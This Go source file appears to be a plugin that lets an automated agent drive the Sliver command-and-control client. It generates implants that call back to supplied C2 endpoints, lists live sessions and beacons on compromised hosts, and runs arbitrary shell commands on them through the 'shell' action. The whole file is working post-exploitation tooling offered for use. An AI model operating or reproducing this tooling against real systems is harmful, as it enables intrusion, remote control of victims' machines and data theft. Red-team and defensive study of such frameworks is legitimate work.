package main

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	sdkinput "github.com/zero-day-ai/sdk/input"
	"github.com/zero-day-ai/sdk/toolerr"
	"github.com/zero-day-ai/sdk/exec"
	"github.com/zero-day-ai/sdk/health"
	"github.com/zero-day-ai/sdk/tool"
	"github.com/zero-day-ai/sdk/types"
)

const (
	ToolName        = "sliver"
	ToolVersion     = "1.0.0"
	ToolDescription = "Sliver C2 framework integration for implant generation, session management, and command execution"
	BinaryName      = "sliver-client"
)

// ToolImpl implements the sliver tool logic
type ToolImpl struct{}

// NewTool creates a new sliver tool instance
func NewTool() tool.Tool {
	cfg := tool.NewConfig().
		SetName(ToolName).
		SetVersion(ToolVersion).
		SetDescription(ToolDescription).
		SetTags([]string{
			"command-and-control",
			"c2",
			"post-exploitation",
			"T1071", // Application Layer Protocol
			"T1573", // Encrypted Channel
		}).
		SetInputSchema(InputSchema()).
		SetOutputSchema(OutputSchema()).
		SetExecuteFunc((&ToolImpl{}).Execute)

	t, _ := tool.New(cfg)
	return &toolWithHealth{Tool: t, impl: &ToolImpl{}}
}

// toolWithHealth wraps the tool to add custom health checks
type toolWithHealth struct {
	tool.Tool
	impl *ToolImpl
}

func (t *toolWithHealth) Health(ctx context.Context) types.HealthStatus {
	return t.impl.Health(ctx)
}

// Execute runs the sliver tool with the provided input
func (t *ToolImpl) Execute(ctx context.Context, input map[string]any) (map[string]any, error) {
	startTime := time.Now()

	// Extract action parameter
	action := sdkinput.GetString(input, "action", "")
	if action == "" {
		return nil, fmt.Errorf("action is required")
	}

	var output map[string]any
	var err error

	switch action {
	case "generate":
		output, err = t.generateImplant(ctx, input)
	case "sessions":
		output, err = t.listSessions(ctx)
	case "beacons":
		output, err = t.listBeacons(ctx)
	case "use":
		output, err = t.useSession(ctx, input)
	case "shell":
		output, err = t.executeCommand(ctx, input)
	default:
		return nil, fmt.Errorf("unknown action: %s", action)
	}

	if err != nil {
		return nil, err
	}

	// Add execution time
	output["execution_time_ms"] = int(time.Since(startTime).Milliseconds())

	return output, nil
}

// generateImplant generates a new Sliver implant
func (t *ToolImpl) generateImplant(ctx context.Context, input map[string]any) (map[string]any, error) {
	implantConfig := sdkinput.GetMap(input, "implant_config")
	if implantConfig == nil {
		return nil, fmt.Errorf("implant_config is required for 'generate' action")
	}

	targetOS := sdkinput.GetString(implantConfig, "os", "windows")
	arch := sdkinput.GetString(implantConfig, "arch", "amd64")
	format := sdkinput.GetString(implantConfig, "format", "exe")
	c2Endpoints := sdkinput.GetStringSlice(implantConfig, "c2_endpoints")

	if len(c2Endpoints) == 0 {
		return nil, fmt.Errorf("at least one C2 endpoint is required")
	}

	// Build sliver command for implant generation
	args := []string{
		"generate",
		"--os", targetOS,
		"--arch", arch,
		"--format", format,
		"--skip-symbols",
	}

	// Add C2 endpoints
	for _, endpoint := range c2Endpoints {
		if strings.HasPrefix(endpoint, "https://") {
			args = append(args, "--http", endpoint)
		} else if strings.HasPrefix(endpoint, "http://") {
			args = append(args, "--http", endpoint)
		} else if strings.HasPrefix(endpoint, "mtls://") {
			args = append(args, "--mtls", strings.TrimPrefix(endpoint, "mtls://"))
		} else if strings.HasPrefix(endpoint, "wg://") {
			args = append(args, "--wg", strings.TrimPrefix(endpoint, "wg://"))
		} else if strings.HasPrefix(endpoint, "dns://") {
			args = append(args, "--dns", strings.TrimPrefix(endpoint, "dns://"))
		}
	}

	// Create output directory
	outputDir := os.TempDir()
	args = append(args, "--save", outputDir)

	// Execute sliver-client command
	result, err := exec.Run(ctx, exec.Config{
		Command: BinaryName,
		Args:    args,
		Timeout: sdkinput.DefaultTimeout(),
	})

	if err != nil {
		return nil, &toolerr.Error{
			Tool:      ToolName,
			Operation: "generate",
			Code:      toolerr.ErrCodeExecutionFailed,
			Message:   fmt.Sprintf("failed to generate implant: %v", err),
			Details:   map[string]any{"exit_code": result.ExitCode},
		}
	}

	// Parse output to find implant path
	outputStr := string(result.Stdout)
	implantPath := ""

	// Look for the generated file in the output directory
	// Sliver typically creates files with names like "ADJECTIVE_NOUN.exe"
	files, _ := filepath.Glob(filepath.Join(outputDir, "*"))
	for _, file := range files {
		info, err := os.Stat(file)
		if err == nil && !info.IsDir() && time.Since(info.ModTime()) < 10*time.Second {
			implantPath = file
			break
		}
	}

	return map[string]any{
		"success":       true,
		"output":        strings.TrimSpace(outputStr),
		"implant_path":  implantPath,
		"sessions":      []any{},
		"beacons":       []any{},
	}, nil
}

// listSessions lists all active Sliver sessions
func (t *ToolImpl) listSessions(ctx context.Context) (map[string]any, error) {
	args := []string{"sessions", "-j"} // JSON output

	result, err := exec.Run(ctx, exec.Config{
		Command: BinaryName,
		Args:    args,
		Timeout: 30 * time.Second,
	})

	if err != nil {
		return nil, &toolerr.Error{
			Tool:      ToolName,
			Operation: "sessions",
			Code:      toolerr.ErrCodeExecutionFailed,
			Message:   fmt.Sprintf("failed to list sessions: %v", err),
			Details:   map[string]any{"exit_code": result.ExitCode},
		}
	}

	// Parse JSON output
	var sessions []map[string]any
	if len(result.Stdout) > 0 {
		if err := json.Unmarshal(result.Stdout, &sessions); err != nil {
			// If JSON parsing fails, return empty list
			sessions = []map[string]any{}
		}
	}

	// Transform sessions to match our schema
	transformedSessions := transformSessions(sessions)

	return map[string]any{
		"success":  true,
		"sessions": transformedSessions,
		"beacons":  []any{},
		"output":   fmt.Sprintf("Found %d active session(s)", len(transformedSessions)),
	}, nil
}

// listBeacons lists all active Sliver beacons
func (t *ToolImpl) listBeacons(ctx context.Context) (map[string]any, error) {
	args := []string{"beacons", "-j"} // JSON output

	result, err := exec.Run(ctx, exec.Config{
		Command: BinaryName,
		Args:    args,
		Timeout: 30 * time.Second,
	})

	if err != nil {
		return nil, &toolerr.Error{
			Tool:      ToolName,
			Operation: "beacons",
			Code:      toolerr.ErrCodeExecutionFailed,
			Message:   fmt.Sprintf("failed to list beacons: %v", err),
			Details:   map[string]any{"exit_code": result.ExitCode},
		}
	}

	// Parse JSON output
	var beacons []map[string]any
	if len(result.Stdout) > 0 {
		if err := json.Unmarshal(result.Stdout, &beacons); err != nil {
			// If JSON parsing fails, return empty list
			beacons = []map[string]any{}
		}
	}

	// Transform beacons to match our schema
	transformedBeacons := transformBeacons(beacons)

	return map[string]any{
		"success":  true,
		"sessions": []any{},
		"beacons":  transformedBeacons,
		"output":   fmt.Sprintf("Found %d active beacon(s)", len(transformedBeacons)),
	}, nil
}

// useSession switches to a specific session
func (t *ToolImpl) useSession(ctx context.Context, input map[string]any) (map[string]any, error) {
	sessionID := sdkinput.GetString(input, "session_id", "")
	if sessionID == "" {
		return nil, fmt.Errorf("session_id is required for 'use' action")
	}

	args := []string{"use", sessionID}

	result, err := exec.Run(ctx, exec.Config{
		Command: BinaryName,
		Args:    args,
		Timeout: 10 * time.Second,
	})

	if err != nil {
		return nil, &toolerr.Error{
			Tool:      ToolName,
			Operation: "use",
			Code:      toolerr.ErrCodeExecutionFailed,
			Message:   fmt.Sprintf("failed to use session: %v", err),
			Details:   map[string]any{"exit_code": result.ExitCode},
		}
	}

	return map[string]any{
		"success":  true,
		"sessions": []any{},
		"beacons":  []any{},
		"output":   strings.TrimSpace(string(result.Stdout)),
	}, nil
}

// executeCommand executes a shell command on a session
func (t *ToolImpl) executeCommand(ctx context.Context, input map[string]any) (map[string]any, error) {
	sessionID := sdkinput.GetString(input, "session_id", "")
	command := sdkinput.GetString(input, "command", "")

	if sessionID == "" {
		return nil, fmt.Errorf("session_id is required for 'shell' action")
	}
	if command == "" {
		return nil, fmt.Errorf("command is required for 'shell' action")
	}

	// First, use the session
	useArgs := []string{"use", sessionID}
	_, err := exec.Run(ctx, exec.Config{
		Command: BinaryName,
		Args:    useArgs,
		Timeout: 10 * time.Second,
	})

	if err != nil {
		return nil, &toolerr.Error{
			Tool:      ToolName,
			Operation: "shell",
			Code:      toolerr.ErrCodeExecutionFailed,
			Message:   fmt.Sprintf("failed to use session: %v", err),
		}
	}

	// Execute the shell command
	shellArgs := []string{"shell", command}
	result, err := exec.Run(ctx, exec.Config{
		Command: BinaryName,
		Args:    shellArgs,
		Timeout: sdkinput.DefaultTimeout(),
	})

	if err != nil {
		return nil, &toolerr.Error{
			Tool:      ToolName,
			Operation: "shell",
			Code:      toolerr.ErrCodeExecutionFailed,
			Message:   fmt.Sprintf("failed to execute command: %v", err),
			Details:   map[string]any{"exit_code": result.ExitCode},
		}
	}

	return map[string]any{
		"success":  true,
		"sessions": []any{},
		"beacons":  []any{},
		"output":   strings.TrimSpace(string(result.Stdout)),
	}, nil
}

// Health checks if the Sliver server is accessible
func (t *ToolImpl) Health(ctx context.Context) types.HealthStatus {
	// Check if sliver-client binary exists
	binaryCheck := health.BinaryCheck(BinaryName)
	if !binaryCheck.IsHealthy() {
		return binaryCheck
	}

	// Try to connect to Sliver server by listing sessions
	result, err := exec.Run(ctx, exec.Config{
		Command: BinaryName,
		Args:    []string{"sessions", "-j"},
		Timeout: 10 * time.Second,
	})

	if err != nil {
		return types.NewUnhealthyStatus(
			fmt.Sprintf("Sliver server not accessible: %v", err),
			map[string]any{
				"binary":    BinaryName,
				"error":     err.Error(),
				"exit_code": result.ExitCode,
			},
		)
	}

	return types.NewHealthyStatus(fmt.Sprintf("%s is available and Sliver server is accessible", BinaryName))
}

// transformSessions transforms raw session data to match our schema
func transformSessions(rawSessions []map[string]any) []map[string]any {
	sessions := make([]map[string]any, 0, len(rawSessions))
	for _, raw := range rawSessions {
		session := map[string]any{
			"id":        getString(raw, "ID", getString(raw, "id", "")),
			"name":      getString(raw, "Name", getString(raw, "name", "")),
			"hostname":  getString(raw, "Hostname", getString(raw, "hostname", "")),
			"username":  getString(raw, "Username", getString(raw, "username", "")),
			"os":        getString(raw, "OS", getString(raw, "os", "")),
			"transport": getString(raw, "Transport", getString(raw, "transport", "")),
		}
		sessions = append(sessions, session)
	}
	return sessions
}

// transformBeacons transforms raw beacon data to match our schema
func transformBeacons(rawBeacons []map[string]any) []map[string]any {
	beacons := make([]map[string]any, 0, len(rawBeacons))
	for _, raw := range rawBeacons {
		beacon := map[string]any{
			"id":        getString(raw, "ID", getString(raw, "id", "")),
			"name":      getString(raw, "Name", getString(raw, "name", "")),
			"hostname":  getString(raw, "Hostname", getString(raw, "hostname", "")),
			"username":  getString(raw, "Username", getString(raw, "username", "")),
			"os":        getString(raw, "OS", getString(raw, "os", "")),
			"transport": getString(raw, "Transport", getString(raw, "transport", "")),
			"interval":  getString(raw, "Interval", getString(raw, "interval", "")),
			"jitter":    getString(raw, "Jitter", getString(raw, "jitter", "")),
		}
		beacons = append(beacons, beacon)
	}
	return beacons
}

// getString safely extracts a string from a map with multiple key attempts
func getString(m map[string]any, keys ...string) string {
	for _, key := range keys {
		if val, ok := m[key]; ok {
			if str, ok := val.(string); ok {
				return str
			}
		}
	}
	return ""
}
